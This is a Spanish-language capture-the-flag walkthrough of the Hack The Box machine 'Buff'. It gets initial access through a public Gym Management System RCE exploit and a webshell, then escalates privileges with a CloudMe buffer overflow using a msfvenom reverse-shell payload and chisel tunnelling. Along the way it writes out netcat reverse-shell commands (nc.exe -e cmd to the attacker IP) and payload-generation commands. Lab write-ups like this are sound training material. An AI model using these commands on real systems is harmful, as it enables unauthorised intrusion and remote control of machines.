# Buff

## Información General

<h3> Dificultad: <img src="https://img.shields.io/badge/Fácil-Green"> </h3>

<h3> Sistema operativo: Windows</h3>

<h3> Vulnerabilidad explotada: Gym Management System Exploitation (RCE), CloudMe Exploitation [Buffer Overflow] [Python Scripting] </h3>

<h3> Fecha de resolución: 13/11/2025 </h3>

<h3>Enlace de la mv: <a href="https://app.hackthebox.com/machines/263" target="_blank">Buff</a></h3>

### *Leer el documentro en Ingles* <a href="buff_ingles.md">Buff</a>

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.125.113**

Voy a establecer en el fichero **/etc/hosts** la **ip de la mv objetivo**, la voy a llamar **buff**

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.125.113
```

**Su ttl es 127. Por tanto, es Windows**

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.125.113
```

<p align="center">

<img src="images/Pasted image 20251111180400.png" width="600" alt="Resultado de Nmap">

</p>

<div align="center">

| Open port | Service | Version |
| --------- | ------- | ------- |
| 8080      | http    | -       |

</div>

## Exploración

```
http://10.129.125.113:8080/
```

<p align="center">

<img src="images/Pasted image 20251111180758.png" width="600" alt="Resultado de Nmap">
<img src="images/Pasted image 20251111191313.png" width="600" alt="Resultado de Nmap">

</p>

### Whatweb

```
./whatweb http://10.129.25.107:8080/
```

**http://10.129.25.107:8080/ [200 OK] Apache[2.4.43], Bootstrap, Cookies[sec_session_id], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], HttpOnly[sec_session_id], IP[10.129.25.107], JQuery[1.11.0,1.9.1], OpenSSL[1.1.1g], PHP[7.4.6], PasswordField[password], Script[text/JavaScript,text/javascript], Shopify, Title[mrb3n's Bro Hut], Vimeo, X-Powered-By[PHP/7.4.6], X-UA-Compatible[IE=edge]**

### Fuzzing web

```
dirb http://10.129.25.107/
```

<p align="center">

<img src="images/Pasted image 20251111190311.png" width="600" alt="Resultado de Nmap">

</p>

La mitad de las paginas me pide permiso de super usuario.

Por tanto, voy probar usar la herramienta **searchsploit** que trata de buscarme exploit del framework que usa la pagina llamado **gym management**

```
searchsploit gym management
```

<p align="center">

<img src="images/Pasted image 20251112103505.png" width="600" alt="Resultado de Nmap">
<img src="images/Pasted image 20251112103532.png" width="600" alt="Resultado de Nmap">
</p>

Nos descargamos el exploit de **Gym Management System 1.0 - Unauthenticated Remote Code Execution** con el siguiente comando:

```
searchsploit -m php/webapps/48506.py 
```

Para ejecutar el exploit hara falta **python2**

```
python2 48506.py "http://10.129.125.113:8080/"
```

<p align="center">

<img src="images/Pasted image 20251112105457.png" width="600" alt="Resultado de Nmap">

</p>

El usuario es **shaun**

Aveces este exploit no funciona, reinicia la kali o la maquina victima y puede que vuelva funcionar, a mi por lo menos me funcionó así.

La idea ahora sería trasladarnos esta sesión a nuestra kali eso lo haríamos con **netcat**

## Explotación

### Revershell de una MV windows a mi kali

Luego en mi kali descargo  <a href="https://eternallybored.org/misc/netcat/" target="_blank">**netcat**</a>

<p align="center">
<img src="images/Pasted image 20251112120952.png" width="600" alt="Resultado de Nmap">
</p>

Luego introducimos el siguiente comando  dentro de la carpeta **netcat**:

```
impacket-smbserver smbFolder $(pwd) -smb2support
```

Luego, explicaré como he construido la siguiente ruta para usarlo en el navegador:

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=
```

Necesito ver el exploit que hemos utilizado antes (48506.py), podemos ver que se guarda en la ruta **upload/kamehameha.php** usando el parametro **telepathy** 

<p align="center">
<img src="images/Pasted image 20251112122140.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto, si escribimos:

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=whoami 
```

Añadimos este atajo de teclado **control + u**, obtenemos lo siguiente:

<p align="center">
<img src="images/Pasted image 20251112122557.png" width="600" alt="Resultado de Nmap">
</p>

Ahora bien, lo que en verdad buscamos es otra cosa, visualizar la carpeta compartida **smbFolder** para ello escribimos lo siguiente:

```
http://IPMAQUINA-VICTIMA:PUERTO-DONDE-SE-ALOJA/RUTA?PARAMETRO=dir \\IPATACANTE\NOMBRE-DE-LA-CARPETA-QUE-COMPARTES\
```
```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=dir \\10.10.14.82\smbFolder\
```

Añadimos este atajo de teclado **control + u**, obtenemos lo siguiente:

<p align="center">
<img src="images/Pasted image 20251112122823.png" width="600" alt="Resultado de Nmap">
</p>

Antes hay que tener activado el puerto de escucha:

```
rlwrap nc -lvnp 443
```

Luego, el archivo **nc.exe** nos va a servir para abrir una **shell** en nuestra maquina atacante, el comando para llevarlo acabo sería:

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=\\10.10.14.82\smbFolder\nc.exe -e cmd 10.10.14.82 443
```

<p align="center">
<img src="images/Pasted image 20251112124457.png" width="600" alt="Resultado de Nmap">
</p>

Podemos comprobar como accedemos a la shell de nuestra MV, podemos cerrar el navegador de abajo y continuar.

Investigando en el sistema dentro del home del usuario **shaun**. En la carpeta de descarga me encuentro un .exe llamado **CloudMe_1112.exe**. Me da por buscar esto en la herramienta **searchsploit** con el siguiente comando

```
searchsploit CloudMe
```

<p align="center">
<img src="images/Pasted image 20251112161948.png" width="600" alt="Resultado de Nmap">
</p>

Me encuentro este archivo que llama la atención, investigando lo que hace este exploit en pocas palabras es que obtengo el superusuario mediante un fallo que tiene esta app por buffer OverFlow 

```
searchsploit -m windows/remote/48389.py
```

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=netstat -ano
```
<p align="center">
<img src="images/Pasted image 20251112163223.png" width="600" alt="Resultado de Nmap">
</p>

Investigando descubro que el puerto 8888 está abierto por la app cloudme. 
**AVISO** es bastante inestable esta conexión asique a la hora de realizar la escalada nos vas a costar mucho.  

## Escalada de Privilegios
### Explicación buffer over flow

Observemos script 48389.py

<p align="center">
<img src="images/Pasted image 20251113112407.png" width="600" alt="Resultado de Nmap">
</p>

El objetivo es básicamente sustituir el payload

```
msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
```

por este:

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.82 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload
```

Resultado:

<p align="center">
<img src="images/Pasted image 20251113131757.png" width="600" alt="Resultado de Nmap">
</p>

Objetivo final:

<p align="center">
<img src="images/Pasted image 20251113132035.png" width="600" alt="Resultado de Nmap">
</p>

Este nuevo script lo llamaré **cloudme.py** .Esto nos daría una sesión con lo máximo privilegio. **OJO, puede estar dando bastantes problemas porque el puerto 88 es inestable.** En el navegador ponemos lo siguiente:

```
view-source:http://10.129.130.220:8080/upload/kamehameha.php?telepathy=copy \\10.10.14.82\\smbFolder\chisel.exe
```

En mi kali, donde estoy compartiendo hay un archivo llamado **chisel.exe** que copiare hacia la maquina windows, el archivo lo he descargado aquí.

```
https://github.com/jpillora/chisel/releases/tag/v1.11.3
```

<p align="center">
<img src="images/Pasted image 20251113132632.png" width="600" alt="Resultado de Nmap">
</p>

Luego, para establecer conexión, en mi kali tengo que tener instalado esto:

<p align="center">
<img src="images/Pasted image 20251113132942.png" width="600" alt="Resultado de Nmap">
</p>

Una vez instalado cada chisel en las máquinas, haremos lo siguiente

En mi kali escribimos:

```
gunzip chisel_1.11.3_linux_amd64.deb
chmod +x
./chisel_1.11.3_linux_386 server -p 1234 --reverse
```

<p align="center">
<img src="images/Pasted image 20251113133646.png" width="600" alt="Resultado de Nmap">
</p>

En la maquina windows, en el navegador:

```
view-source:http://10.129.130.220:8080/upload/kamehameha.php?telepathy=chisel.exe client 10.10.14.82:1234 R:8888:127.0.0.1:8888
```

Como resultado en mi kali saldra esto:

<p align="center">
<img src="images/Pasted image 20251113134009.png" width="600" alt="Resultado de Nmap">
</p>

Tengo establecido el puerto 8888 de la maquina windows que es el cloudme en mi maquina kali gracias a chisel. Ahora lo siguiente sería, en mi kali establecer el puerto de escucha

```
rlwrap nc -lvnp 4444
```

Luego ejecutar el script cloudme.py

```
python3 cloudme.py
```

Una vez obtenida la conexión, rapidamente intentamos conseguir flag de root (porque la conexion es muy inestable)

```
type \Users\Administrator\Desktop\root.txt
```

<p align="center">
<img src="images/Pasted image 20251113134358.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

La máquina de HTB **buff** resultó espectacular de principio a fin. Empezamos con el puerto **8080 (HTTP)** abierto y, al explorar la aplicación, identifiqué que se trataba de un sistema de **Gym Management**. Con **searchsploit** localicé un exploit aplicable y, tras ejecutarlo con **python2**, obtuvimos acceso inicial (aunque inestable), por lo que continuamos interactuando principalmente desde el navegador. Dentro del directorio del usuario **shaun** encontré un binario llamado **cloudme**; de nuevo busqué exploits con **searchsploit** y hallé uno basado en **buffer overflow**, al que sustituí el payload por uno generado con **msfvenom** para obtener una reverse shell con privilegios elevados. Para encaminarnos al puerto remoto, instalé **chisel** en Windows y en mi Kali y tunelizamos el puerto **8888 (cloudme)** a mi máquina; tras preparar el listener en el puerto **4444** y ejecutar el exploit **cloudme.py** con **python3**, conseguí el acceso con cuenta de superusuario. En resumen: una máquina bastante por culera porque la conexión es bastante inestable, y si es la primera vez, como en mi caso, a la hora de aprender como funciona buffer over flow va ser muy frustante.